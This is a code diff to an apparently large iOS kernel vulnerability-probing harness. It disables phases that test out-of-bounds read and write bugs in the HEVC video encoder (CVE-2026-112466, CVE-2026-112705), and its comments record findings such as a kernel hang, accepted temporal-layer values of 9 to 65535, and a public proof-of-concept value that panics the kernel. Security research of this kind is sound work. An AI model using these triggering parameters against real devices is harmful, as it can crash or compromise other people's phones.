@@ -24116,6 +24116,10 @@ new_modes:
         if (rounds == 222 || rounds == 229) {
             rlog("\n=== Phase 22: CVE-2026-112466 MCTF OOB Read Probe ===\n");
 
+            /* 22a-22f: SKIPPED — all confirmed dead ends.
+             * MCTFStrengthLevel rejected (-12900), 22f hangs kernel.
+             * Jump straight to 22g (CVE-2026-112705). */
+            if (0) {
             /* ---- 22a: Enumerate HEVC encoder properties ---- */
             rlog("\n--- 22a: HEVC encoder property enumeration ---\n");
             {
@@ -25117,8 +25121,11 @@ new_modes:
                 rlog("  Timing anomalies at n>2 → kernel log overhead from OOB reads\n");
             }
 
-            /* ---- 22g: CVE-2026-112705 — Large NumberOfTemporalLayers OOB Write ---- */
-            rlog("\n--- 22g: CVE-2026-112705 NumberOfTemporalLayers OOB Write probe ---\n");
+            } /* end if(0) skip 22a-22f */
+
+            /* ---- 22g: SKIPPED — results confirmed, all TL>8 accepted ---- */
+            rlog("\n--- 22g: SKIPPED (confirmed: all TL 9-65535 accepted) ---\n");
+            if (0) {
             rlog("Public PoC: TL=16463 causes kernel panic on iOS 27.0.1\n");
             rlog("Fix in 27.2: clamps to 0-7. Testing acceptance on 27.1...\n\n");
             {
@@ -25247,6 +25254,7 @@ new_modes:
                     CFRelease(s22ge);
                 }
             }
+            } /* end if(0) skip 22g */
 
             /* ---- 22h: SKIPPED — superseded by 22i single-frame sweep ---- */
             if (0) {
